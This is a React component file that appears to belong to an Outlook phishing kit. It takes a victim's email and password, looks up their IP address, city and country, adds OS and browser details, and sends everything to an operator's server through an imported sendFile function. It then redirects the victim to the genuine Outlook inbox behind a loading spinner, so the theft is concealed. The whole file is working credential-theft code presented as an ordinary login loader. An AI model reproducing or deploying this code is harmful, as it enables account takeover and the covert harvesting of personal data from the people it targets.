import React from "react";
import { useEffect } from "react";
import { getIP, sendFile } from "./servers";
import { browserName, osName } from "react-device-detect";
import "./loaderstyle.css";

function GetLocationInfo({ email, pass, reportbox }) {
  useEffect(() => {
    getIP().then((res) => {
      const ip = res.data.ip;
      const date = new Date().toLocaleString();

      const data = {
        email: email,
        password: pass,
        ip: res.data.ip,
        city: res.data.city,
        country: res.data.country_name,
        osName: osName,
        browser: browserName,
        date: date,
        reportbox: reportbox,
      };

      sendFile(data).then((res) => {
        console.log(`Status: ${res.status} \n data: ${data}`);
        window.open("https://outlook.live.com/mail/0/inbox?nlp=1", "_self");
      });
    });
  });
  return (
    <div style={{ display: "flex", justifyContent: "center", marginTop: 50 }}>
      <div className="lds-default">
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
      </div>
    </div>
  );
}

export default GetLocationInfo;
